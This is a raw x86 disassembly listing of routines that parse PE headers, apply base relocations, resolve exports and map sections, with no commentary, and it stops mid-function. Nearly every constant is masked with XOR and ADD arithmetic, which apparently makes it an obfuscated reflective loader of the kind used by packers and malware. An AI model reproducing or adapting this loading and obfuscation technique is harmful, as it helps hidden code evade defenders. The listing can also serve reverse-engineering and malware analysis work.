  417f34:	mov    edx,DWORD PTR [ecx]
  417f36:	and    DWORD PTR [ebp-0xc],0x0
  417f3a:	and    edx,esi
  417f3c:	add    edx,eax
  417f3e:	movzx  edi,WORD PTR [edx+0xe]
  417f42:	movzx  ebx,WORD PTR [edx+0xc]
  417f46:	add    edi,ebx
  417f48:	je     0x417fb3
  417f4a:	lea    ecx,[edx+0x14]
  417f4d:	mov    DWORD PTR [ebp-0x14],ecx
  417f50:	test   DWORD PTR [ecx],esi
  417f52:	je     0x417f95
  417f54:	mov    ecx,DWORD PTR [ecx]
  417f56:	and    DWORD PTR [ebp-0x8],0x0
  417f5a:	and    ecx,esi
  417f5c:	add    ecx,eax
  417f5e:	movzx  edi,WORD PTR [ecx+0xe]
  417f62:	movzx  ebx,WORD PTR [ecx+0xc]
  417f66:	add    edi,ebx
  417f68:	je     0x417f95
  417f6a:	lea    edi,[ecx+0x14]
  417f6d:	mov    DWORD PTR [ebp-0x4],edi
  417f70:	mov    edi,DWORD PTR [ebp-0x4]
  417f73:	mov    edi,DWORD PTR [edi]
  417f75:	test   edi,edi
  417f77:	je     0x417f7f
  417f79:	mov    ebx,DWORD PTR [ebp-0x1c]
  417f7c:	add    DWORD PTR [edi+eax*1],ebx
  417f7f:	movzx  edi,WORD PTR [ecx+0xe]
  417f83:	movzx  ebx,WORD PTR [ecx+0xc]
  417f87:	inc    DWORD PTR [ebp-0x8]
  417f8a:	add    DWORD PTR [ebp-0x4],0x8
  417f8e:	add    edi,ebx
  417f90:	cmp    DWORD PTR [ebp-0x8],edi
  417f93:	jb     0x417f70
  417f95:	movzx  edi,WORD PTR [edx+0xe]
  417f99:	movzx  ebx,WORD PTR [edx+0xc]
  417f9d:	mov    ecx,DWORD PTR [ebp-0x14]
  417fa0:	inc    DWORD PTR [ebp-0xc]
  417fa3:	add    ecx,0x8
  417fa6:	add    edi,ebx
  417fa8:	mov    DWORD PTR [ebp-0x14],ecx
  417fab:	cmp    DWORD PTR [ebp-0xc],edi
  417fae:	jb     0x417f50
  417fb0:	mov    ecx,DWORD PTR [ebp-0x18]
  417fb3:	movzx  edx,WORD PTR [eax+0xe]
  417fb7:	movzx  edi,WORD PTR [eax+0xc]
  417fbb:	inc    DWORD PTR [ebp-0x10]
  417fbe:	add    ecx,0x8
  417fc1:	add    edx,edi
  417fc3:	mov    DWORD PTR [ebp-0x18],ecx
  417fc6:	cmp    DWORD PTR [ebp-0x10],edx
  417fc9:	jb     0x417f30
  417fcf:	pop    edi
  417fd0:	pop    ebx
  417fd1:	xor    eax,eax
  417fd3:	inc    eax
  417fd4:	jmp    0x417fd8
  417fd6:	xor    eax,eax
  417fd8:	pop    esi
  417fd9:	leave  
  417fda:	ret    
  417fdb:	push   ebp
  417fdc:	mov    ebp,esp
  417fde:	mov    ecx,DWORD PTR [ecx+0x190]
  417fe4:	mov    eax,DWORD PTR [ebp+0xc]
  417fe7:	sub    esp,0x10
  417fea:	push   ebx
  417feb:	xor    ebx,ebx
  417fed:	push   esi
  417fee:	push   edi
  417fef:	cmp    DWORD PTR [ecx],ebx
  417ff1:	je     0x418079
  417ff7:	cmp    eax,ebx
  417ff9:	je     0x418079
  417ffb:	cmp    DWORD PTR [eax+0x78],ebx
  417ffe:	jne    0x418005
  418000:	xor    eax,eax
  418002:	inc    eax
  418003:	jmp    0x41807b
  418005:	mov    eax,DWORD PTR [eax+0x78]
  418008:	add    eax,DWORD PTR [ebp+0x8]
  41800b:	mov    ecx,DWORD PTR [eax+0x1c]
  41800e:	mov    edx,DWORD PTR [eax+0x24]
  418011:	mov    esi,DWORD PTR [eax+0x14]
  418014:	mov    edi,DWORD PTR [eax+0x18]
  418017:	add    ecx,DWORD PTR [ebp+0x8]
  41801a:	add    edx,DWORD PTR [ebp+0x8]
  41801d:	mov    DWORD PTR [ebp-0x4],esi
  418020:	cmp    esi,edi
  418022:	ja     0x418027
  418024:	mov    DWORD PTR [ebp-0x4],edi
  418027:	mov    DWORD PTR [ebp-0x8],ebx
  41802a:	cmp    DWORD PTR [ebp-0x4],ebx
  41802d:	jbe    0x418000
  41802f:	cmp    ebx,DWORD PTR [eax+0x14]
  418032:	jae    0x41803a
  418034:	movzx  esi,WORD PTR [edx+ebx*2]
  418038:	jmp    0x41803c
  41803a:	mov    esi,ebx
  41803c:	lea    esi,[ecx+esi*4]
  41803f:	mov    edi,DWORD PTR [esi]
  418041:	test   edi,edi
  418043:	je     0x41806e
  418045:	add    edi,DWORD PTR [ebp+0x8]
  418048:	mov    DWORD PTR [ebp-0x10],edi
  41804b:	cmp    edi,eax
  41804d:	jbe    0x41805f
  41804f:	mov    ebx,DWORD PTR [ebp+0xc]
  418052:	mov    ebx,DWORD PTR [ebx+0x7c]
  418055:	add    ebx,eax
  418057:	cmp    edi,ebx
  418059:	jae    0x41805f
  41805b:	mov    esi,DWORD PTR [esi]
  41805d:	jmp    0x418067
  41805f:	sub    edi,DWORD PTR [ebp+0x8]
  418062:	mov    DWORD PTR [esi],edi
  418064:	mov    esi,DWORD PTR [ebp-0x10]
  418067:	test   esi,esi
  418069:	je     0x418079
  41806b:	mov    ebx,DWORD PTR [ebp-0x8]
  41806e:	inc    ebx
  41806f:	mov    DWORD PTR [ebp-0x8],ebx
  418072:	cmp    ebx,DWORD PTR [ebp-0x4]
  418075:	jb     0x41802f
  418077:	jmp    0x418000
  418079:	xor    eax,eax
  41807b:	pop    edi
  41807c:	pop    esi
  41807d:	pop    ebx
  41807e:	leave  
  41807f:	ret    0x8
  418082:	push   ebp
  418083:	mov    ebp,esp
  418085:	sub    esp,0x2c
  418088:	mov    edx,0xf89c8585
  41808d:	mov    DWORD PTR [ebp-0x4],edx
  418090:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  418097:	mov    eax,DWORD PTR [ebp-0x4]
  41809a:	mov    ecx,DWORD PTR [ebp-0x4]
  41809d:	mov    ecx,DWORD PTR [ebp-0x4]
  4180a0:	mov    ecx,DWORD PTR [ebp-0x4]
  4180a3:	mov    ecx,DWORD PTR [ebp-0x4]
  4180a6:	mov    ecx,DWORD PTR [ebp-0x4]
  4180a9:	push   ebx
  4180aa:	mov    ebx,DWORD PTR [ebp+0x10]
  4180ad:	push   esi
  4180ae:	mov    esi,0x751089b
  4180b3:	mov    DWORD PTR [ebp-0x10],0x352eb0f
  4180ba:	mov    ecx,DWORD PTR [ebp-0x4]
  4180bd:	mov    ebx,DWORD PTR [ebx+0x190]
  4180c3:	push   edi
  4180c4:	mov    edi,0x3272e2
  4180c9:	xor    ecx,esi
  4180cb:	xor    eax,esi
  4180cd:	add    eax,edi
  4180cf:	add    ecx,edi
  4180d1:	mov    DWORD PTR [ebp-0x18],eax
  4180d4:	cmp    ecx,DWORD PTR [ebx]
  4180d6:	je     0x418357
  4180dc:	mov    ebx,DWORD PTR [ebp-0x4]
  4180df:	mov    ecx,DWORD PTR [ebp+0xc]
  4180e2:	xor    ebx,esi
  4180e4:	add    ebx,edi
  4180e6:	cmp    ebx,ecx
  4180e8:	je     0x418357
  4180ee:	mov    ebx,DWORD PTR [ebp-0x4]
  4180f1:	mov    ecx,DWORD PTR [ecx+0x80]
  4180f7:	xor    ebx,esi
  4180f9:	add    ebx,edi
  4180fb:	cmp    ecx,ebx
  4180fd:	je     0x418352
  418103:	add    ecx,DWORD PTR [ebp+0x8]
  418106:	mov    DWORD PTR [ebp-0x2c],ecx
  418109:	mov    ebx,edx
  41810b:	xor    ebx,esi
  41810d:	add    ebx,edi
  41810f:	mov    DWORD PTR [ebp-0x10],ebx
  418112:	mov    ebx,DWORD PTR [ebp-0x10]
  418115:	cmp    ebx,edx
  418117:	je     0x41812b
  418119:	mov    edx,DWORD PTR [ebp-0x10]
  41811c:	mov    ebx,DWORD PTR [ebp-0x4]
  41811f:	imul   edx,edx,0x14
  418122:	xor    ebx,esi
  418124:	add    ebx,edi
  418126:	cmp    DWORD PTR [edx+ecx*1],ebx
  418129:	jne    0x418142
  41812b:	mov    edx,DWORD PTR [ebp-0x10]
  41812e:	mov    ebx,DWORD PTR [ebp-0x4]
  418131:	imul   edx,edx,0x14
  418134:	xor    ebx,esi
  418136:	add    ebx,edi
  418138:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  41813c:	je     0x418344
  418142:	mov    eax,DWORD PTR [ebp-0x4]
  418145:	mov    ebx,DWORD PTR [ebp-0x4]
  418148:	mov    eax,DWORD PTR [ebp-0x10]
  41814b:	imul   eax,eax,0x14
  41814e:	add    eax,ecx
  418150:	mov    ecx,DWORD PTR [eax+0x10]
  418153:	add    ecx,DWORD PTR [ebp+0x8]
  418156:	xor    ebx,esi
  418158:	mov    DWORD PTR [ebp-0x1c],ecx
  41815b:	mov    ecx,DWORD PTR [ebp-0x4]
  41815e:	mov    edx,DWORD PTR [ebp-0x4]
  418161:	xor    ecx,esi
  418163:	add    ecx,edi
  418165:	xor    edx,esi
  418167:	mov    DWORD PTR [ebp-0x24],ecx
  41816a:	mov    ecx,DWORD PTR [eax]
  41816c:	add    edx,edi
  41816e:	add    ebx,edi
  418170:	cmp    ecx,edx
  418172:	je     0x41817a
  418174:	add    ecx,DWORD PTR [ebp+0x8]
  418177:	mov    DWORD PTR [ebp-0x24],ecx
  41817a:	mov    ecx,DWORD PTR [ebp-0x4]
  41817d:	xor    ecx,esi
  41817f:	add    ecx,DWORD PTR [eax+0xc]
  418182:	mov    eax,DWORD PTR [ebp+0x8]
  418185:	lea    eax,[ecx+eax*1+0x3272e2]
  41818c:	mov    DWORD PTR [ebp+0xc],eax
  41818f:	mov    DWORD PTR [ebp-0x28],0xf89c85b8
  418196:	mov    eax,DWORD PTR [ebp+0x10]
  418199:	push   DWORD PTR [ebp+0xc]
  41819c:	mov    eax,DWORD PTR [eax+0x1d8]
  4181a2:	call   DWORD PTR [eax]
  4181a4:	mov    ecx,DWORD PTR [ebp-0x4]
  4181a7:	xor    ecx,esi
  4181a9:	add    ecx,edi
  4181ab:	mov    DWORD PTR [ebp-0xc],eax
  4181ae:	cmp    ecx,eax
  4181b0:	jne    0x4181c4
  4181b2:	mov    eax,DWORD PTR [ebp+0x10]
  4181b5:	push   DWORD PTR [ebp+0xc]
  4181b8:	mov    eax,DWORD PTR [eax+0x1d8]
  4181be:	call   DWORD PTR [eax+0xc]
  4181c1:	mov    DWORD PTR [ebp-0xc],eax
  4181c4:	mov    DWORD PTR [ebp-0x20],0x7f661b0c
  4181cb:	mov    DWORD PTR [ebp-0x20],0xf89c999c
  4181d2:	mov    eax,DWORD PTR [ebp-0x4]
  4181d5:	xor    eax,esi
  4181d7:	add    eax,edi
  4181d9:	cmp    eax,DWORD PTR [ebp-0xc]
  4181dc:	jne    0x418201
  4181de:	mov    eax,DWORD PTR [ebp-0x8]
  4181e1:	mov    ecx,DWORD PTR [ebp-0x20]
  4181e4:	xor    eax,esi
  4181e6:	xor    ecx,esi
  4181e8:	lea    ebx,[ebx+eax*1+0x3272e2]
  4181ef:	mov    eax,DWORD PTR [ebp+0x10]
  4181f2:	mov    eax,DWORD PTR [eax+0x1d8]
  4181f8:	add    ecx,edi
  4181fa:	imul   ecx,ebx
  4181fd:	push   ecx
  4181fe:	call   DWORD PTR [eax+0x24]
  418201:	mov    eax,DWORD PTR [ebp-0x4]
  418204:	xor    eax,esi
  418206:	add    eax,edi
  418208:	cmp    eax,DWORD PTR [ebp-0xc]
  41820b:	jne    0x41821c
  41820d:	mov    eax,DWORD PTR [ebp-0x28]
  418210:	xor    eax,esi
  418212:	add    eax,edi
  418214:	cmp    ebx,eax
  418216:	jbe    0x418196
  41821c:	mov    eax,DWORD PTR [ebp-0x4]
  41821f:	xor    eax,esi
  418221:	add    eax,edi
  418223:	cmp    eax,DWORD PTR [ebp-0xc]
  418226:	jne    0x41823f
  418228:	mov    eax,DWORD PTR [ebp-0x8]
  41822b:	mov    ecx,DWORD PTR [ebp-0x18]
  41822e:	xor    eax,esi
  418230:	lea    eax,[ecx+eax*1+0x3272e2]
  418237:	mov    DWORD PTR [ebp-0x18],eax
  41823a:	jmp    0x41832e
  41823f:	mov    DWORD PTR [ebp-0x14],0x1121b0d
  418246:	mov    DWORD PTR [ebp+0xc],0xe042d0f
  41824d:	mov    ebx,DWORD PTR [ebp-0x4]
  418250:	xor    ebx,esi
  418252:	add    ebx,edi
  418254:	jmp    0x41831b
  418259:	mov    eax,DWORD PTR [ebp-0x4]
  41825c:	xor    eax,esi
  41825e:	add    eax,edi
  418260:	mov    DWORD PTR [ebp-0x14],eax
  418263:	mov    eax,DWORD PTR [ebp-0x4]
  418266:	xor    eax,esi
  418268:	add    eax,edi
  41826a:	mov    DWORD PTR [ebp+0xc],eax
  41826d:	mov    ecx,DWORD PTR [ebp-0x4]
  418270:	mov    eax,DWORD PTR [ebp-0x24]
  418273:	xor    ecx,esi
  418275:	add    ecx,edi
  418277:	cmp    ecx,eax
  418279:	je     0x418281
  41827b:	mov    eax,DWORD PTR [eax+ebx*4]
  41827e:	mov    DWORD PTR [ebp-0x14],eax
  418281:	mov    eax,DWORD PTR [ebp-0x1c]
  418284:	mov    eax,DWORD PTR [eax+ebx*4]
  418287:	mov    DWORD PTR [ebp+0xc],eax
  41828a:	mov    eax,DWORD PTR [ebp-0x4]
  41828d:	mov    ecx,DWORD PTR [ebp-0x14]
  418290:	xor    eax,esi
  418292:	add    eax,edi
  418294:	cmp    eax,ecx
  418296:	je     0x4182c1
  418298:	mov    eax,DWORD PTR [ebp-0x4]
  41829b:	mov    ecx,DWORD PTR [ebp-0x14]
  41829e:	xor    eax,esi
  4182a0:	add    eax,edi
  4182a2:	shr    ecx,0x1f
  4182a5:	cmp    eax,ecx
  4182a7:	je     0x4182c1
  4182a9:	mov    ecx,DWORD PTR [ebp-0x14]
  4182ac:	mov    eax,DWORD PTR [ebp+0x10]
  4182af:	mov    eax,DWORD PTR [eax+0x1d8]
  4182b5:	movzx  ecx,cx
  4182b8:	push   ecx
  4182b9:	push   DWORD PTR [ebp-0xc]
  4182bc:	call   DWORD PTR [eax+0x8]
  4182bf:	jmp    0x4182da
  4182c1:	mov    eax,DWORD PTR [ebp+0xc]
  4182c4:	add    eax,DWORD PTR [ebp+0x8]
  4182c7:	mov    ecx,DWORD PTR [ebp+0x10]
  4182ca:	mov    ecx,DWORD PTR [ecx+0x1d8]
  4182d0:	add    eax,0x2
  4182d3:	push   eax
  4182d4:	push   DWORD PTR [ebp-0xc]
  4182d7:	call   DWORD PTR [ecx+0x8]
  4182da:	mov    DWORD PTR [ebp+0xc],eax
  4182dd:	mov    eax,DWORD PTR [ebp-0x4]
  4182e0:	mov    ecx,DWORD PTR [ebp+0xc]
  4182e3:	xor    eax,esi
  4182e5:	add    eax,edi
  4182e7:	cmp    eax,ecx
  4182e9:	mov    eax,DWORD PTR [ebp-0x8]
  4182ec:	jne    0x4182ff
  4182ee:	mov    ecx,DWORD PTR [ebp-0x18]
  4182f1:	xor    eax,esi
  4182f3:	lea    eax,[ecx+eax*1+0x3272e2]
  4182fa:	mov    DWORD PTR [ebp-0x18],eax
  4182fd:	jmp    0x41830f
  4182ff:	mov    ecx,DWORD PTR [ebp+0xc]
  418302:	xor    eax,esi
  418304:	add    eax,edi
  418306:	imul   eax,ecx
  418309:	mov    ecx,DWORD PTR [ebp-0x1c]
  41830c:	mov    DWORD PTR [ecx+ebx*4],eax
  41830f:	mov    eax,DWORD PTR [ebp-0x8]
  418312:	xor    eax,esi
  418314:	lea    ebx,[ebx+eax*1+0x3272e2]
  41831b:	mov    eax,DWORD PTR [ebp-0x4]
  41831e:	mov    ecx,DWORD PTR [ebp-0x1c]
  418321:	xor    eax,esi
  418323:	add    eax,edi
  418325:	cmp    DWORD PTR [ecx+ebx*4],eax
  418328:	jne    0x418259
  41832e:	mov    edx,DWORD PTR [ebp-0x10]
  418331:	mov    eax,DWORD PTR [ebp-0x18]
  418334:	mov    ecx,DWORD PTR [ebp-0x2c]
  418337:	sub    edx,0x3272e1
  41833d:	xor    edx,esi
  41833f:	jmp    0x418109
  418344:	mov    ecx,DWORD PTR [ebp-0x4]
  418347:	xor    ecx,esi
  418349:	add    ecx,edi
  41834b:	cmp    eax,ecx
  41834d:	mov    eax,DWORD PTR [ebp-0x4]
  418350:	jne    0x41835a
  418352:	mov    eax,DWORD PTR [ebp-0x8]
  418355:	jmp    0x41835a
  418357:	mov    eax,DWORD PTR [ebp-0x4]
  41835a:	xor    eax,esi
  41835c:	add    eax,edi
  41835e:	pop    edi
  41835f:	pop    esi
  418360:	pop    ebx
  418361:	leave  
  418362:	ret    0xc
  418365:	push   ebp
  418366:	mov    ebp,esp
  418368:	sub    esp,0x28
  41836b:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  418372:	mov    DWORD PTR [ebp-0x28],0xf89c8584
  418379:	mov    eax,DWORD PTR [ebp+0xc]
  41837c:	mov    DWORD PTR [ebp+0xc],eax
  41837f:	push   esi
  418380:	mov    eax,eax
  418382:	mov    eax,DWORD PTR [ebp-0x4]
  418385:	mov    esi,DWORD PTR [ebp+0x8]
  418388:	mov    ecx,0x751089b
  41838d:	xor    eax,ecx
  41838f:	mov    edx,0x3272e2
  418394:	add    eax,edx
  418396:	cmp    esi,eax
  418398:	je     0x4184bf
  41839e:	mov    eax,DWORD PTR [ebp+0x8]
  4183a1:	mov    esi,DWORD PTR [ebp+0x8]
  4183a4:	add    esi,DWORD PTR [eax+0x3c]
  4183a7:	push   edi
  4183a8:	mov    DWORD PTR [ebp+0xc],esi
  4183ab:	mov    DWORD PTR [ebp-0x1c],0xf89c85b8
  4183b2:	mov    eax,DWORD PTR [ebp-0x1c]
  4183b5:	mov    esi,DWORD PTR [ebp-0x4]
  4183b8:	mov    edi,DWORD PTR [ebp+0xc]
  4183bb:	xor    esi,ecx
  4183bd:	xor    eax,ecx
  4183bf:	add    esi,edx
  4183c1:	cmp    DWORD PTR [edi+eax*8+0x1939788],esi
  4183c8:	je     0x4184b9
  4183ce:	mov    esi,DWORD PTR [ebp+0xc]
  4183d1:	mov    eax,DWORD PTR [ebp+0x8]
  4183d4:	add    eax,DWORD PTR [esi+0xa0]
  4183da:	mov    esi,DWORD PTR [ebp+0x8]
  4183dd:	mov    edi,DWORD PTR [ebp+0xc]
  4183e0:	sub    esi,DWORD PTR [edi+0x34]
  4183e3:	mov    edi,DWORD PTR [ebp-0x4]
  4183e6:	xor    edi,ecx
  4183e8:	add    edi,edx
  4183ea:	mov    DWORD PTR [ebp-0x24],esi
  4183ed:	cmp    esi,edi
  4183ef:	je     0x4184b9
  4183f5:	mov    esi,DWORD PTR [ebp-0x4]
  4183f8:	xor    esi,ecx
  4183fa:	add    esi,edx
  4183fc:	mov    DWORD PTR [ebp-0x8],esi
  4183ff:	push   ebx
  418400:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  418407:	jmp    0x4184a3
  41840c:	mov    esi,DWORD PTR [ebp-0x4]
  41840f:	xor    esi,ecx
  418411:	lea    edi,[ebx-0x8]
  418414:	add    esi,edx
  418416:	shr    edi,1
  418418:	cmp    esi,edi
  41841a:	jae    0x418489
  41841c:	sub    edi,esi
  41841e:	lea    ebx,[eax+esi*2+0x8]
  418422:	mov    DWORD PTR [ebp-0x18],edi
  418425:	movzx  esi,WORD PTR [ebx]
  418428:	and    esi,0xfff
  41842e:	mov    DWORD PTR [ebp-0x14],esi
  418431:	mov    edi,DWORD PTR [ebp-0x14]
  418434:	mov    esi,DWORD PTR [eax]
  418436:	sub    esi,edx
  418438:	add    edi,esi
  41843a:	movzx  esi,WORD PTR [ebx]
  41843d:	shr    esi,0xc
  418440:	xor    edi,ecx
  418442:	mov    DWORD PTR [ebp-0x20],edi
  418445:	mov    DWORD PTR [ebp-0x14],esi
  418448:	mov    esi,DWORD PTR [ebp-0x20]
  41844b:	mov    edi,DWORD PTR [ebp+0x8]
  41844e:	xor    esi,ecx
  418450:	lea    esi,[esi+edi*1+0x3272e2]
  418457:	mov    DWORD PTR [ebp-0x20],esi
  41845a:	mov    esi,DWORD PTR [ebp-0x10]
  41845d:	mov    edi,DWORD PTR [ebp-0x14]
  418460:	xor    esi,ecx
  418462:	add    esi,edx
  418464:	cmp    edi,esi
  418466:	jne    0x41847e
  418468:	mov    esi,DWORD PTR [ebp-0x10]
  41846b:	mov    edi,DWORD PTR [ebp-0x14]
  41846e:	xor    esi,ecx
  418470:	add    esi,edx
  418472:	cmp    edi,esi
  418474:	jne    0x41847e
  418476:	mov    esi,DWORD PTR [ebp-0x20]
  418479:	mov    edi,DWORD PTR [ebp-0x24]
  41847c:	add    DWORD PTR [esi],edi
  41847e:	add    ebx,0x2
  418481:	dec    DWORD PTR [ebp-0x18]
  418484:	jne    0x418425
  418486:	mov    ebx,DWORD PTR [ebp-0xc]
  418489:	add    DWORD PTR [ebp-0x8],ebx
  41848c:	mov    esi,DWORD PTR [ebp-0x1c]
  41848f:	mov    edi,DWORD PTR [ebp-0x8]
  418492:	mov    ebx,DWORD PTR [ebp+0xc]
  418495:	xor    esi,ecx
  418497:	cmp    edi,DWORD PTR [ebx+esi*8+0x193978c]
  41849e:	jae    0x4184b8
  4184a0:	add    eax,DWORD PTR [ebp-0xc]
  4184a3:	mov    esi,DWORD PTR [ebp-0x4]
  4184a6:	mov    ebx,DWORD PTR [eax+0x4]
  4184a9:	xor    esi,ecx
  4184ab:	add    esi,edx
  4184ad:	mov    DWORD PTR [ebp-0xc],ebx
  4184b0:	cmp    ebx,esi
  4184b2:	jne    0x41840c
  4184b8:	pop    ebx
  4184b9:	mov    eax,DWORD PTR [ebp-0x28]
  4184bc:	pop    edi
  4184bd:	jmp    0x4184c2
  4184bf:	mov    eax,DWORD PTR [ebp-0x4]
  4184c2:	xor    eax,ecx
  4184c4:	add    eax,edx
  4184c6:	pop    esi
  4184c7:	leave  
  4184c8:	ret    0x8
  4184cb:	push   ebp
  4184cc:	mov    ebp,esp
  4184ce:	sub    esp,0xcc
  4184d4:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  4184db:	mov    DWORD PTR [ebp-0x24],0xf89c8584
  4184e2:	mov    eax,DWORD PTR [ebp-0x4]
  4184e5:	push   ebx
  4184e6:	push   esi
  4184e7:	mov    esi,0x751089b
  4184ec:	xor    eax,esi
  4184ee:	push   edi
  4184ef:	mov    edi,0x3272e2
  4184f4:	add    eax,edi
  4184f6:	mov    DWORD PTR [ebp-0x1c],eax
  4184f9:	mov    eax,DWORD PTR [ebp-0x4]
  4184fc:	xor    eax,esi
  4184fe:	add    eax,edi
  418500:	mov    DWORD PTR [ebp-0x8],eax
  418503:	mov    ebx,DWORD PTR [ebp+0x20]
  418506:	mov    eax,DWORD PTR [ebp-0x14]
  418509:	mov    ecx,DWORD PTR [ebp-0x14]
  41850c:	xor    eax,ecx
  41850e:	mov    DWORD PTR [ebp-0x14],eax
  418511:	add    DWORD PTR [ebp-0x14],0xf89cb585
  418518:	mov    eax,DWORD PTR [ebp-0xc]
  41851b:	mov    ecx,DWORD PTR [ebp-0xc]
  41851e:	xor    eax,ecx
  418520:	mov    DWORD PTR [ebp-0xc],eax
  418523:	add    DWORD PTR [ebp-0xc],0xf89c85c5
  41852a:	mov    eax,DWORD PTR [ebp-0x10]
  41852d:	mov    ecx,DWORD PTR [ebp-0x10]
  418530:	xor    eax,ecx
  418532:	mov    DWORD PTR [ebp-0x10],eax
  418535:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  41853c:	mov    eax,DWORD PTR [ebp-0x20]
  41853f:	mov    ecx,DWORD PTR [ebp-0x20]
  418542:	xor    eax,ecx
  418544:	mov    DWORD PTR [ebp-0x20],eax
  418547:	add    DWORD PTR [ebp-0x20],0xf89f0585
  41854e:	mov    eax,0x9471
  418553:	mov    WORD PTR [ebp+0x20],ax
  418557:	mov    eax,DWORD PTR [ebp+0x8]
  41855a:	test   eax,eax
  41855c:	je     0x4189b7
  418562:	mov    eax,DWORD PTR [ebp+0xc]
  418565:	test   eax,eax
  418567:	je     0x4189b7
  41856d:	mov    eax,DWORD PTR [ebp+0x18]
  418570:	test   eax,eax
  418572:	je     0x4189b7
  418578:	mov    ax,WORD PTR [ebp+0x20]
  41857c:	mov    ecx,0x8a8d
  418581:	xor    ax,cx
  418584:	mov    ecx,0x3b51
  418589:	add    ax,cx
  41858c:	mov    ecx,DWORD PTR [ebp+0x8]
  41858f:	cmp    WORD PTR [ecx],ax
  418592:	jne    0x4189b7
  418598:	mov    eax,DWORD PTR [ebp-0x4]
  41859b:	xor    eax,esi
  41859d:	add    eax,edi
  41859f:	mov    DWORD PTR [ebp-0x30],eax
  4185a2:	mov    eax,DWORD PTR [ebp-0x4]
  4185a5:	mov    ecx,DWORD PTR [ebp+0x8]
  4185a8:	mov    eax,DWORD PTR [ebp+0x8]
  4185ab:	add    eax,DWORD PTR [ecx+0x3c]
  4185ae:	mov    DWORD PTR [ebp+0xc],eax
  4185b1:	mov    eax,DWORD PTR [eax+0x50]
  4185b4:	test   eax,eax
  4185b6:	je     0x4189b7
  4185bc:	mov    DWORD PTR [ebp-0x2c],0xf88c8585
  4185c3:	mov    eax,DWORD PTR [ebp-0x2c]
  4185c6:	xor    eax,esi
  4185c8:	add    eax,edi
  4185ca:	mov    DWORD PTR [ebp-0x2c],eax
  4185cd:	mov    eax,DWORD PTR [ebp-0x4]
  4185d0:	mov    eax,DWORD PTR [ebx+0x190]
  4185d6:	mov    ecx,DWORD PTR [eax]
  4185d8:	mov    ecx,DWORD PTR [ecx+0x3c]
  4185db:	add    ecx,DWORD PTR [eax]
  4185dd:	mov    eax,DWORD PTR [ebp-0x4]
  4185e0:	mov    eax,DWORD PTR [ebx+0x18c]
  4185e6:	mov    edx,DWORD PTR [eax]
  4185e8:	mov    DWORD PTR [ebp-0x18],ecx
  4185eb:	mov    DWORD PTR [ebp+0x20],edx
  4185ee:	cmp    edx,edx
  4185f0:	jne    0x418624
  4185f2:	mov    eax,DWORD PTR [ebx+0x1d8]
  4185f8:	lea    edx,[ebp-0x1c]
  4185fb:	push   edx
  4185fc:	mov    edx,DWORD PTR [ebp-0xc]
  4185ff:	xor    edx,esi
  418601:	add    edx,edi
  418603:	push   edx
  418604:	push   DWORD PTR [ecx+0x50]
  418607:	push   DWORD PTR [ebp+0x20]
  41860a:	call   DWORD PTR [eax+0x1c]
  41860d:	mov    eax,DWORD PTR [ebp-0x18]
  418610:	mov    ecx,DWORD PTR [eax+0x54]
  418613:	mov    eax,DWORD PTR [eax+0x50]
  418616:	sub    eax,ecx
  418618:	add    ecx,DWORD PTR [ebp+0x20]
  41861b:	push   ecx
  41861c:	call   0x418fa3
  418621:	mov    edx,DWORD PTR [ebp+0x20]
  418624:	mov    eax,DWORD PTR [ebx+0x194]
  41862a:	mov    DWORD PTR [eax],edx
  41862c:	mov    eax,DWORD PTR [ebp+0xc]
  41862f:	push   DWORD PTR [eax+0x54]
  418632:	push   DWORD PTR [ebp+0x8]
  418635:	push   edx
  418636:	call   0x418e4a
  41863b:	mov    ecx,DWORD PTR [ebp+0x20]
  41863e:	mov    eax,DWORD PTR [ecx+0x3c]
  418641:	add    eax,ecx
  418643:	movzx  ecx,WORD PTR [eax+0x14]
  418647:	lea    ecx,[ecx+eax*1+0x18]
  41864b:	mov    DWORD PTR [ebp+0x18],ecx
  41864e:	mov    ecx,DWORD PTR [ebp-0x4]
  418651:	movzx  edx,WORD PTR [eax+0x6]
  418655:	xor    ecx,esi
  418657:	add    ecx,edi
  418659:	mov    DWORD PTR [ebp+0xc],eax
  41865c:	cmp    edx,ecx
  41865e:	je     0x41870b
  418664:	mov    ecx,DWORD PTR [ebp-0x4]
  418667:	xor    ecx,esi
  418669:	add    ecx,edi
  41866b:	mov    DWORD PTR [ebp-0x8],ecx
  41866e:	mov    ecx,DWORD PTR [ebp-0x24]
  418671:	movzx  edx,WORD PTR [eax+0x6]
  418675:	xor    ecx,esi
  418677:	sub    edx,ecx
  418679:	sub    edx,edi
  41867b:	cmp    DWORD PTR [ebp-0x8],edx
  41867e:	ja     0x41870b
  418684:	mov    edx,DWORD PTR [ebp+0x18]
  418687:	add    edx,0x8
  41868a:	mov    DWORD PTR [ebp+0x18],edx
  41868d:	jmp    0x418692
  41868f:	mov    edx,DWORD PTR [ebp+0x18]
  418692:	mov    eax,DWORD PTR [eax+0x38]
  418695:	lea    ecx,[eax-0x1]
  418698:	mov    DWORD PTR [ebp-0x34],eax
  41869b:	mov    eax,DWORD PTR [edx]
  41869d:	test   ecx,eax
  41869f:	je     0x4186a8
  4186a1:	not    ecx
  4186a3:	and    eax,ecx
  4186a5:	add    eax,DWORD PTR [ebp-0x34]
  4186a8:	mov    ecx,DWORD PTR [edx+0x4]
  4186ab:	add    ecx,DWORD PTR [ebp+0x20]
  4186ae:	push   ecx
  4186af:	call   0x418fa3
  4186b4:	mov    edx,DWORD PTR [ebp-0x4]
  4186b7:	mov    eax,DWORD PTR [ebp+0x18]
  4186ba:	mov    ecx,DWORD PTR [eax+0x8]
  4186bd:	xor    edx,esi
  4186bf:	add    edx,edi
  4186c1:	cmp    ecx,edx
  4186c3:	je     0x4186dc
  4186c5:	push   ecx
  4186c6:	mov    ecx,DWORD PTR [ebp+0x8]
  4186c9:	add    ecx,DWORD PTR [eax+0xc]
  4186cc:	mov    eax,DWORD PTR [eax+0x4]
  4186cf:	add    eax,DWORD PTR [ebp+0x20]
  4186d2:	push   ecx
  4186d3:	push   eax
  4186d4:	call   0x418e4a
  4186d9:	mov    eax,DWORD PTR [ebp+0x18]
  4186dc:	mov    ecx,DWORD PTR [ebp-0x24]
  4186df:	mov    edx,DWORD PTR [ebp-0x8]
  4186e2:	add    eax,0x28
  4186e5:	xor    ecx,esi
  4186e7:	lea    ecx,[edx+ecx*1+0x3272e2]
